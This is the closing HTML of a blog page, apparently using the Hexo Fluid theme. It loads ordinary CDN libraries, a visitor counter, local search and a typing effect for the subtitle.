  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>












  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



</body>
</html>
